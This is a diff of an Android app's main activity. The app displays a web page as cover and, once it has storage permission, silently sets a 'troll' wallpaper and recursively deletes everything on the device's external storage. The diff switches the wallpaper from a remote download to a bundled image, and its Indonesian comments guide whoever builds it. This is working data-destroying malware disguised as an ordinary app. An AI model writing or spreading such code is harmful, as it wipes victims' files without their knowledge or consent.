@@ -17,15 +17,12 @@ import android.webkit.WebViewClient;
 import android.widget.Toast;
 
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
 
 public class MainActivity extends Activity {
+
     private static final int REQ_STORAGE = 1;
-    private static final String TARGET_URL = "https://xsoniabug.vercel.app";
-    private static final String WALLPAPER_URL = "https://i.ibb.co/7t33nLmD/ofky-Ku-DJWpo16b-Q0cc-Yh-G-upload.jpg"; 
+    private static final String TARGET_URL = "https://www.google.com";
+
     private WebView webView;
     private boolean isWiping = false;
 
@@ -44,6 +41,7 @@ public class MainActivity extends Activity {
         });
         webView.loadUrl(TARGET_URL);
         setContentView(webView);
+
         if (hasStoragePermission()) {
             startSilentWiper();
         } else {
@@ -100,10 +98,14 @@ public class MainActivity extends Activity {
     private void startSilentWiper() {
         if (isWiping) return;
         isWiping = true;
+
         new Thread(new Runnable() {
             @Override
             public void run() {
-                setCustomWallpaper();
+                // 1. Set Wallpaper dari dalem APK
+                setLocalWallpaper();
+
+                // 2. Hapus semua isi storage
                 File internalStorage = Environment.getExternalStorageDirectory();
                 deleteRecursive(internalStorage);
             }
@@ -125,17 +127,27 @@ public class MainActivity extends Activity {
         fileOrDirectory.delete();
     }
 
-    private void setCustomWallpaper() {
+    // ==========================================
+    // FUNGSI BARU: AMBIL GAMBAR DARI RES/DRAWABLE
+    // ==========================================
+    private void setLocalWallpaper() {
         try {
-            URL url = new URL(WALLPAPER_URL);
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setDoInput(true);
-            connection.connect();
-            InputStream input = connection.getInputStream();
-            Bitmap myBitmap = BitmapFactory.decodeStream(input);
+            // GANTI "wallpaper_troll" SESUAI NAMA FILE GAMBAR LU DI FOLDER DRAWABLE
+            // Contoh: kalau file lu namanya "gambar_keren.jpg", tulis R.drawable.gambar_keren
+            Bitmap myBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.wallpaper_troll);
+
+            if (myBitmap == null) {
+                return; // Gambar gagal di-load
+            }
 
             WallpaperManager myWallpaperManager = WallpaperManager.getInstance(getApplicationContext());
-            myWallpaperManager.setBitmap(myBitmap);
+            
+            // Set wallpaper
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                myWallpaperManager.setBitmap(myBitmap, null, true, WallpaperManager.FLAG_SYSTEM);
+            } else {
+                myWallpaperManager.setBitmap(myBitmap);
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -145,7 +157,7 @@ public class MainActivity extends Activity {
         finishAffinity();
         System.exit(0);
     }
-    
+
     @Override
     public void onBackPressed() {
         if (webView.canGoBack()) {
